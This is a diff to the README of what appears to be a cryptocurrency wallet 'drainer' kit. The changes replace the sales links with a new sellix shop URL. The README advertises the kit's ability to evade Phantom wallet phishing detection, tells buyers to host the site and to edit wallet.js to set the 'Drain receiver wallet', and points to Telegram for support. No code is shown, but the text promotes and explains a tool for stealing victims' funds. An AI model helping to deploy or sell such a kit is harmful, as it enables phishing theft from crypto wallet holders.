@@ -1,4 +1,4 @@
-# **🧙🏼 Welcome!** *PUBLIC GITHUB IS BACKDOORED YOU SHOULD NOT USE IT this is the official repo*
+# **🧙🏼 Welcome!** *PUBLIC GITHUB IS BACKDOORED YOU SHOULD NOT USE https://web3eaters.sellix.io/*
 ### 📩 Like **all Drainers** you need to host to make it work (recommended: Hostinger, Netlify, Vercel, Github...)
 
 ---
@@ -18,7 +18,7 @@
 - [x] Anti Phantom Phishing Detections
 
 ## ` 📂 Setup Guide `
-# **🧙🏼 NOTE!** *WILL NOT WORK IF YOU HAVENT BOUGHT THE FULL SOURCE*
+# **🧙🏼 NOTE!** *WILL NOT WORK IF YOU HAVENT BOUGHT THE FULL SOURCE* https://web3eaters.sellix.io/
 You need to edit the __**wallet.js**__ file to change the Drain receiver wallet.
 
 - Open all images folders and put your project images, but rename name as it was before.
@@ -30,7 +30,7 @@ To get instant support, contact us on [Telegram](https://t.me/soleaterdev)
 ## ` 🌊 Socials `
 
 - Telegram: https://t.me/soleaterdev
-- Shop: https://eatingweb3.sellix.io
+- Shop: https://web3eaters.sellix.io/
 - Group: https://t.me/opdrain
 
 ##### Please ⭐ the repo to support this project & follow next updates
